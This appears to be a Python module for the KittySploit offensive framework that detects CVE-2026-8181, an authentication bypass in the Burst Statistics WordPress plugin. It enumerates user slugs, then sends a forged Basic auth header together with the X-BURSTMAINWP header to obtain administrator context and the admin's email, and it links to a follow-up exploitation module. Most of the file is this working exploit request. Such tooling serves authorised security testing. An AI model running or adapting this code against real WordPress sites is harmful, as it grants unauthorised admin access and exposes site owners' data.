#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Burst Statistics 3.4.0–3.4.1.1 MainWP auth bypass (CVE-2026-8181)."""

from __future__ import annotations

import base64
import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "burst-statistics"
_VULN_LOW = (3, 4, 0)
_VULN_HIGH = (3, 4, 1, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Burst Statistics CVE-2026-8181 auth bypass detect",
        "description": (
            "CVE-2026-8181: Burst Statistics 3.4.0–3.4.1.1 returns administrator "
            "context on /wp-json/wp/v2/users/me when X-BURSTMAINWP is set."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-8181",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-8181",
            "https://github.com/murrez/CVE-2026-8181",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-8181.yaml",
        ],
        "modules": [
            "auxiliary/admin/http/burst_statistics_cve_2026_8181_auth_bypass",
        ],
        "tags": ["web", "scanner", "wordpress", "burst-statistics", "auth-bypass", "cve-2026-8181"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/burst_statistics_cve_2026_8181_auth_bypass",
                ],
            },
        },
    }

    active_probe = OptBool(
        True,
        "Call /wp-json/wp/v2/users/me with X-BURSTMAINWP (read-only impersonation check)",
        required=False,
    )

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, "/") or ""
        if version and not self.wp_version_in_range(version, _VULN_LOW, _VULN_HIGH):
            return False
        readme = self.http_request(
            method="GET",
            path=f"/wp-content/plugins/{_PLUGIN}/readme.txt",
            allow_redirects=True,
        )
        if not readme or int(readme.status_code) != 200:
            return False
        if "burst statistics" not in (readme.text or "").lower():
            return False
        if not version:
            version = self.wp_extract_version_from_readme(readme.text or "") or ""
        users = self.http_request(method="GET", path="/wp-json/wp/v2/users", allow_redirects=True)
        if not users or int(users.status_code) != 200:
            return False
        slug_m = re.search(r'"slug"\s*:\s*"([^"]+)"', users.text or "")
        admin_user = slug_m.group(1) if slug_m else "admin"
        if not self.active_probe:
            self.set_info(
                severity="high",
                cve="CVE-2026-8181",
                reason="Burst Statistics in vulnerable version range; MainWP bypass not probed",
                version=version or "unknown",
            )
            return True
        token = base64.b64encode(f"{admin_user}:x".encode()).decode()
        probe = self.http_request(
            method="GET",
            path="/wp-json/wp/v2/users/me?context=edit",
            headers={
                "X-BURSTMAINWP": "1",
                "Authorization": f"Basic {token}",
                "Accept": "application/json",
            },
            allow_redirects=True,
        )
        if not probe or int(probe.status_code) != 200:
            return False
        try:
            payload = json.loads(probe.text or "")
        except json.JSONDecodeError:
            return False
        roles = payload.get("roles") or []
        if "administrator" not in roles:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-8181",
            reason=f"MainWP header impersonates administrator ({admin_user})",
            version=version or "unknown",
            email=str(payload.get("email") or ""),
        )
        return True
